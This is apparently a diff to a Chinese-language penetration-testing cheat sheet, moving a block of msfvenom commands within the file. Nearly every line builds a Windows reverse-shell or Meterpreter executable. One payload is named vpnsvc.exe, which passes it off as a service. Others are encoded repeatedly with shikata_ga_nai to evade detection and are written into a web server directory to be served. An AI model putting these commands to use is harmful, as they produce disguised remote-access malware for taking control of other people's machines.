@@ -22,6 +22,20 @@ exe
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.131 LPORT=443 -f exe >vpnsvc.exe
 ```
 
+
+
+
+
+meterpreter
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell64.exe  # 不分段
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell64.exe  #分段
+```
+
+
 加密一次
 ```
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.92  lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/1.exe
@@ -31,14 +45,6 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.
 加密两次
 ```
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.92 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/2.exe
-```
-
-meterpreter
-```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell64.exe  # 不分段
-
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell64.exe  #分段
 ```
 
 
